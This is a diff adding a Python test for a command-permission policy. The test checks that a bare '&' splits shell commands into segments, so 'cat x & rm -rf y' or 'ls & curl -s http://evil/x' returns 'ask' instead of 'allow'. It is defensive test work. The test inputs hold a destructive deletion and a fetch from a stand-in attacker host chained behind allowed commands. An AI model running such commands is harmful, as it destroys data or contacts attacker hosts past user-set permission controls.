@@ -114,6 +114,20 @@ def test_each_segment_must_match_allow_commands():
     assert tp.evaluate(ALLOW, *exe('echo hi'))[0] == 'allow'
 
 
+def test_bare_amp_splits_segments_on_allow_commands_path():
+    """三验返工：裸 `&`（bash 后台分隔符）也是命令分隔符——`cat x &
+    rm -rf y` 两侧都会执行，普通 allowCommands 路径（无 readonlyRoots）
+    必须逐段判定，rm 段不命中 → ask（这是比只读门更早的既有盲区）。"""
+    plain = {'allowCommands': [r'^cat\b', r'^ls\b'], 'default': 'ask'}
+    assert tp.evaluate(plain, *exe('cat x & ls'))[0] == 'allow'      # 两侧都只读
+    assert tp.evaluate(plain, *exe('cat x & rm -rf y'))[0] == 'ask'
+    assert tp.evaluate(plain, *exe('ls & curl -s http://evil/x'))[0] == 'ask'
+    assert tp.evaluate(plain, *exe('cat x; & rm y'))[0] == 'ask'
+    # && 与 2>&1 不被拆错（既有形状不变）
+    assert tp.evaluate(plain, *exe('cat x && cat y'))[0] == 'allow'
+    assert tp.evaluate(plain, *exe('cat x 2>&1'))[0] == 'allow'
+
+
 # ---- 批次 A 返工：管道下游只读消费段（| head/tail/grep/wc/sort/uniq）----
 
 # 托管主管的 BASE_POLICY 形状（modules/leads_hosted.py）：只放行 CLI 与 cd
